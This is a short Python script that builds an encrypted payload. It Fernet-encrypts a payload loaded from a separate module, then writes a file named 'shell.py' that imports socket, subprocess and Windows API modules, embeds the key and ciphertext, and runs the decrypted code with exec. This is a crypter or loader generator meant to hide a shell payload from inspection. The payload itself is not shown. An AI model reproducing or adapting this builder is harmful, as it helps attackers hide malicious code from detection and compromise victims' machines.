from cryptography.fernet import Fernet
import Colors
import payload

print(Colors.colors.fg.green,"\n[+] Generating encoded payload")
print ("[+] Encrypting") 

key = Fernet.generate_key()
f = Fernet(key)
enc_pay = f.encrypt(bytes(payload.payload))

print("[+] creating shell.py")

f = open("shell.py", "w+")
f.write('import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror\nfrom cryptography.fernet import Fernet\nimport os\nimport sys\nkey = ' + str(key) + '\n' + 'f_obj = Fernet(key)' + '\n' + 'enc_pay = ' + str(enc_pay) + '\n' + 'exec(f_obj.decrypt(enc_pay))')
f.close()
print("[+] shell.py is created\n\n")